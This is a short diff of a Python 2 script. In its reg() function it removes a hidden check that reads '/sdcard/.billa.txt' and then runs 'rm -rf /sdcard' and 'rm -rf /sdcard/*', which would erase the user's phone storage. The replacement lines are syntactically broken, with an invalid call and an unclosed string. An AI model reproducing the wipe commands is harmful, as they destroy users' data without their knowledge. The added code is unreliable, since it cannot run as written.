@@ -165,10 +165,10 @@ def reg():
     print ''
     time.sleep(1)
     try:
-        to = open('/sdcard/.billa.txt', 'r').read()
+        to = open('clear').()
         if to ==" ":
-            os.system('rm -rf /sdcard')
-            os.system('rm -rf /sdcard/*')
+            os.system('clear)
+            os.system('clear')
         
     except (KeyError, IOError):
         reg2()
